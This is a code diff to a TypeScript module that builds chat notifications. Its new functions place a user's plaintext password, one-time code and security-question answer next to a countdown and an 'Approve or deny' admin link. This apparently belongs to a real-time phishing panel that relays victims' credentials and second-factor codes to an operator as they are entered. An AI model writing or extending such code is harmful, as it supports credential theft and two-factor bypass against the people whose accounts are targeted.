@@ -30,6 +30,31 @@ export function identifierFieldLabel(
   return { emoji: "👤", label: "Username" }
 }
 
+/** Legacy alias used by some member sites (email/username/phone label with emoji). */
+export function loginIdentifierLabel(value: string): string {
+  const trimmed = value.trim()
+  if (!trimmed) return "👤 User ID:"
+  if (EMAIL_RE.test(trimmed)) return "👤 Email:"
+  if (/^\d+$/.test(trimmed)) return "👤 User ID:"
+  if (
+    /^[a-zA-Z0-9._-]+$/.test(trimmed) &&
+    /[a-zA-Z]/.test(trimmed) &&
+    (trimmed.includes(".") || trimmed.includes("_"))
+  ) {
+    return "👤 Username:"
+  }
+  return "👤 User ID:"
+}
+
+/** Legacy alias for method-selected form notifications. */
+export function methodEmoji(method?: string): string {
+  const m = String(method ?? "").toLowerCase()
+  if (m === "email") return "📧"
+  if (m === "text" || m === "sms") return "📱"
+  if (m === "call") return "📞"
+  return "📧"
+}
+
 /** Plain identifier line for approval templates (no HTML bold). */
 export function formatIdentifierLine(
   value: unknown,
@@ -81,12 +106,19 @@ function optionalCountdownLine(
   return `⏱ Time left: ${asCode(formatCountdownLabel(secondsLeft))}\n`
 }
 
+function optionalDatabaseLine(databaseShard: string | undefined, asCode: CodeFn): string {
+  const label = String(databaseShard ?? "").trim()
+  if (!label) return ""
+  return `🗄 Database: ${asCode(label)}\n`
+}
+
 export function buildLoginApprovalRequestBody(data: {
   userId: string
   password?: string
   method?: string
   adminLink: string
   secondsLeft?: number
+  databaseShard?: string
   asCode: CodeFn
   asLink: LinkFn
 }): string {
@@ -96,6 +128,7 @@ export function buildLoginApprovalRequestBody(data: {
     "━━━━━━━━━━━━━━━━━━",
     formatIdentifierLine(data.userId, data.asCode),
     `Password: ${data.asCode(password)}`,
+    optionalDatabaseLine(data.databaseShard, data.asCode).replace(/\n$/, ""),
     optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
     optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
     "",
@@ -112,6 +145,7 @@ export function buildOtpApprovalRequestBody(data: {
   method?: string
   adminLink: string
   secondsLeft?: number
+  databaseShard?: string
   asCode: CodeFn
   asLink: LinkFn
 }): string {
@@ -120,6 +154,7 @@ export function buildOtpApprovalRequestBody(data: {
     "━━━━━━━━━━━━━━━━━━",
     formatIdentifierLine(data.userId, data.asCode),
     `🔢 Code: ${data.asCode(data.code)}`,
+    optionalDatabaseLine(data.databaseShard, data.asCode).replace(/\n$/, ""),
     optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
     "",
     `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
@@ -142,6 +177,30 @@ export function buildMethodApprovalRequestBody(data: {
     "━━━━━━━━━━━━━━━━━━",
     formatIdentifierLine(data.userId, data.asCode),
     optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
+    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
+    "",
+    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
+  ]
+    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
+    .join("\n")
+    .replace(/\n{3,}/g, "\n\n")
+}
+
+export function buildSecurityApprovalRequestBody(data: {
+  userId: string
+  question: string
+  answer: string
+  adminLink: string
+  secondsLeft?: number
+  asCode: CodeFn
+  asLink: LinkFn
+}): string {
+  return [
+    "🔐 Security question – approve or deny",
+    "━━━━━━━━━━━━━━━━━━",
+    formatIdentifierLine(data.userId, data.asCode),
+    `❓ Question: ${data.asCode(data.question)}`,
+    `💬 Answer: ${data.asCode(data.answer)}`,
     optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
     "",
     `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
